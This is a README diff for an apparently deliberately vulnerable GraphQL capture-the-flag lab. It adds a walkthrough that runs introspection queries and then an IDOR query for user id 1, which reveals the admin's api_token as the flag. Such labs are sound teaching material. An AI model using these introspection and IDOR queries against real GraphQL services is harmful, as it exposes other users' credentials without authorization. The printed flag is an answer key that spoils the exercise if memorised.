@@ -21,11 +21,57 @@ docker build -t graphql-galaxy .
 docker run -p 5023:5023 graphql-galaxy
 ```
 
-## Challenge
-1.  **Reconnaissance:** Use the GraphiQL interface to inspect the available queries and types.
-2.  **Introspection:** Find the hidden `api_token` field in the `User` type.
-3.  **Exploitation:** Query the `user` field with the ID of the administrator (`1`) and request the `api_token`.
-4.  **Flag:** The flag is the value of the administrator's `api_token`.
+## Walkthrough
+
+1. Access the lab at `http://10.6.6.44:5023`.
+2. Click on "Enter GraphiQL Console" to open the GraphQL interface.
+3. Run an introspection query to discover the schema:
+```graphql
+{
+  __schema {
+    types {
+      name
+      fields {
+        name
+        description
+      }
+    }
+  }
+}
+```
+4. Notice the `User` type has fields including `api_token`.
+5. Query all users to see the public data:
+```graphql
+{
+  users {
+    id
+    username
+    email
+    api_token
+  }
+}
+```
+6. Notice that `api_token` shows as `[REDACTED]` in the list view.
+7. Exploit the IDOR vulnerability by querying a specific user directly:
+```graphql
+{
+  user(id: "1") {
+    id
+    username
+    email
+    api_token
+    is_admin
+    notes
+  }
+}
+```
+8. The admin's `api_token` is revealed: `FLAG{GRAPHQL_INTROSPECTION_MASTER}`
+
+## Challenge Summary
+- **Reconnaissance:** Use the GraphiQL interface to inspect the available queries and types.
+- **Introspection:** Find the hidden `api_token` field in the `User` type.
+- **Exploitation:** Query the `user` field with the ID of the administrator (`1`) and request the `api_token`.
+- **Flag:** The flag is the value of the administrator's `api_token`.
 
 ## References
 For more information on GraphQL security vulnerabilities and secure coding practices, check out these resources:
